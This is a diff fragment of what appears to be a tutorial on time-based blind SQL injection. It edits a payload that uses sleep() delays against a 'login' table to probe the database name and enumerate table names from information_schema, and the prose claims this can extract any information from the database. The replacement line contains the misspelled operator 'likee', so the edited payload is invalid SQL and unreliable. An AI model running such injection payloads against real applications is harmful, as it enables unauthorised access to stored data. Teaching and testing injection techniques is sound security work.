@@ -55,5 +55,5 @@ select id from login where user='admin' and (select sleep(2) from dual where dat
 
 If the database name is 4 character long then there will be a time delay. Now you can ask it questions in such a way that you can get any information from database.
 ```
-select id from login where user='admin' and (select sleep(2) from dual where (table_name from information_schema.tables where table_schema='login' limit 0,1) like '%users%';-- 
+select id from login where user='admin' and (select sleep(2) from dual where (select table_name from information_schema.tables where table_schema='login') likee '%users%');-- 
 ```
